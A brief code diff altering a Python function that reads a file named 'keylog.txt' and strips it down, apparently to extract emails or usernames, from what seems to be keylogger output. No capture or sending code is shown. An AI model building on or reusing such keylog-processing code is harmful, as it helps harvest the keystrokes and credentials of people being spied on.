@@ -29,7 +29,7 @@ def get_clean_data():
     with open("keylog.txt", "r") as file:
         log_data = file.read()
 
-    cleaned_data = ''.join([ch if ch.isalnum() or ch in ['@', '.', '_', '-'] else ' ' for ch in log_data])
+    cleaned_data = ''.join([line.split(' ')[0] for line in log_data.splitlines()])
     return cleaned_data
 
 def extracted_info(cleaned_data):
